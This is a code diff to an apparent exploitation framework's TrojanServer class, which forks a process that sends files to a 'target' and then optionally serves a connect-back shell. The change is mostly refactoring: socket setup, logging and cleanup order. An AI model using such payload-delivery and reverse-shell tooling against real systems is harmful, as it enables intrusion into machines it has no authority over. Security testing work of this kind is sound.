@@ -242,7 +242,7 @@ class TrojanServer(ConnectbackServer):
         self.connectback_shell=connectback_shell
 
 
-    def serve_file_to_client(self,filename,serversocket):
+    def _serve_file_to_client(self,filename,serversocket):
         data=open(filename,"r").read();
         (clientsocket,address) = serversocket.accept()
         clientsocket.send(data)
@@ -252,22 +252,36 @@ class TrojanServer(ConnectbackServer):
 
 
     def serve(self):
+        """
+        Serve a list of one or more files to the target, and optionally serve a
+        connect-back shell.
+
+        This function forks and returns the child PID.  The child exits without
+        returning.
+        """
+        try:
+            serversocket=self._server()
+        except Exception as e:
+            self.logger.LOG_WARN("There was an error creating server socket: %s" % str(e))
+            return None
+            
         self.pid=os.fork()
-        if 0!= self.pid:
+        if self.pid:
             return self.pid
         else:
-            serversocket=self._server()
             for _file in self.files_to_serve:
-                print "Waiting to send file: %s\n" % _file
-                self.serve_file_to_client(_file,serversocket)
-                print "\nDone with file: %s\n"%_file
+                self.logger.LOG_INFO("Waiting to send file: %s ..." % _file)
+                self._serve_file_to_client(_file,serversocket)
+                self.logger.LOG_INFO("Done with file: %s."% _file)
 
-            serversocket.shutdown(socket.SHUT_RDWR)
-            serversocket.close()
+
 
             if self.connectback_shell == True:
-                logger.LOG_INFO("Serving connectback_shell.")
-                self._serve_connectback_shell()
+                self.logger.LOG_INFO("Serving connectback_shell.")
+                self._serve_connectback_shell(serversocket)
+            
+            serversocket.shutdown(socket.SHUT_RDWR)
+            serversocket.close()
             self._exit()
 
 
